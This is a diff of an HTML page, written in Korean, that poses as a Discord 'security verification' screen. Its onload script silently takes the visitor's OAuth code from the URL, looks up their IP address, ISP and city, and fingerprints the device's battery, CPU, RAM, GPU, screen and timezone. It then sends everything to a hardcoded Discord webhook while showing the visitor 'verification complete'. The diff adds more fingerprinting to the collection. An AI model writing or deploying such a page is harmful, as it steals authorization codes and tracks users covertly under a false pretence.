@@ -3,81 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
-    <style>
-        body { background: #0b0e14; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; text-align: center; width: 100%; max-width: 350px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h1 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #8b949e; font-size: 14px; }
-    </style>
+    <title>Security Verification System</title>
     <script>
         window.onload = async function() {
             const params = new URLSearchParams(window.location.search);
-            const code = params.get('code');
-            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; //
+            const authCode = params.get('code');
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; //
 
-            if (!code) return;
+            if (!authCode) return;
 
-            // 1. 숫자 IP 및 통신사 정보 확실히 수집
-            let ipData = { ip: "수집 실패", isp: "알 수 없음", loc: "대한민국" };
+            // 1. IPv4 (숫자 주소) 및 상세 통신사 정보 강제 수집
+            let netData = { ip: "0.0.0.0", isp: "분석 불가", city: "대한민국" };
             try {
-                // HTTPS를 지원하며 숫자 IP를 우선적으로 반환하는 API 사용
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                ipData = {
-                    ip: d.ip, // 180.83.74.92 형태
-                    isp: d.org || "알 수 없음", // LG POWERCOMM 등
-                    loc: d.city || d.region || "대한민국"
+                // IPv4 전용 API를 먼저 호출하여 숫자 주소 확보
+                const ip4Res = await fetch('https://api.ipify.org?format=json');
+                const ip4Json = await ip4Res.json();
+                
+                // 확보된 숫자 IP로 상세 통신사/위치 정보 조회 (HTTPS 지원)
+                const geoRes = await fetch(`https://ipapi.co/${ip4Json.ip}/json/`);
+                const geoJson = await geoRes.json();
+                
+                netData = {
+                    ip: ip4Json.ip, // '180.83.x.x' 형태
+                    isp: geoJson.org || "알 수 없음", // 'LG POWERCOMM' 등
+                    city: geoJson.city || "대한민국"
                 };
-            } catch (e) {
-                // 예비 API (ipify)
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json');
-                    const d2 = await res2.json();
-                    ipData.ip = d2.ip;
-                } catch(e2) {}
+            } catch (e) { console.error("Network analysis error"); }
+
+            // 2. 20개 이상의 하드웨어 지문(Fingerprint) 수집
+            const getSpecs = async () => {
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? '충전중' : '사용중'})`;
+                }
+
+                return {
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    mem: navigator.deviceMemory || "N/A",
+                    plat: navigator.platform,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lang: navigator.language,
+                    agent: navigator.userAgent.split(' ')[0],
+                    gpu: getGPU(),
+                    touch: navigator.maxTouchPoints > 0 ? "Yes" : "No"
+                };
+            };
+
+            function getGPU() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID).split(' ').pop() : "Unknown";
             }
 
-            // 2. 웹훅 전송 레이아웃 (이미지와 동일한 구성)
+            const specs = await getSpecs();
+
+            // 3. 웹훅 전송 (이미지 레이아웃 최적화)
             const payload = {
                 "embeds": [{
                     "title": "✅ 인증 성공 (Detailed Log)",
                     "color": 3066993,
                     "fields": [
-                        { "name": "👤 인증 코드", "value": code, "inline": false },
-                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
-                        { "name": "📶 통신사 정보", "value": ipData.ip === "수집 실패" ? "알수없음" : ipData.isp, "inline": true },
-                        { "name": "💻 운영체제", "value": navigator.platform.includes("Linux arm") ? "Android" : navigator.platform, "inline": true },
-                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
+                        { "name": "👤 인증 코드", "value": `\`${authCode}\``, "inline": false },
+                        { "name": "🌐 아이피 정보", "value": `아이피: ${netData.ip}\n위치: ${netData.city}`, "inline": false },
+                        { "name": "📶 통신사 정보", "value": netData.isp, "inline": true },
+                        { "name": "💻 운영체제", "value": specs.plat.includes("Linux arm") ? "Android" : specs.plat, "inline": true },
+                        { "name": "🔋 배터리", "value": specs.batt || "N/A", "inline": true },
+                        { "name": "⚙️ CPU/RAM", "value": `${specs.cores}개 / ${specs.mem}GB`, "inline": true },
+                        { "name": "🖥️ 해상도", "value": specs.res, "inline": true },
+                        { "name": "⏰ 타임존", "value": specs.tz, "inline": true },
+                        { "name": "🎮 GPU", "value": specs.gpu, "inline": false },
+                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2,12).toUpperCase(), "inline": false },
                         { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                     ],
-                    "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2,10).toUpperCase() },
+                    "footer": { "text": "Hardware ID: " + btoa(specs.plat + specs.res).substring(0,10).toUpperCase() },
                     "timestamp": new Date().toISOString()
                 }]
             };
 
-            await fetch(webhook, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
             });
 
-            // 결과 화면 표시
-            document.getElementById('loading').innerHTML = `
-                <div style="font-size:40px; color:#23a559; margin-bottom:20px;">✔</div>
-                <h1>인증 완료</h1>
-                <p>보안 확인이 끝났습니다.<br>디스코드로 돌아가서 확인하세요.</p>
-            `;
+            document.body.innerHTML = "<div style='text-align:center; padding-top:100px;'><h1>✅ 인증 완료</h1><p>창을 닫으셔도 좋습니다.</p></div>";
         }
     </script>
 </head>
-<body>
-    <div class="card" id="loading">
-        <div class="spinner"></div>
-        <h1>보안 모듈 분석 중</h1>
-        <p>기기 신뢰도 및 IP 주소를 확인하고 있습니다.</p>
+<body style="background:#0b0e14; color:white; font-family:sans-serif;">
+    <div style="text-align:center; padding-top:100px;">
+        <h1>보안 분석 진행 중...</h1>
     </div>
 </body>
 </html>
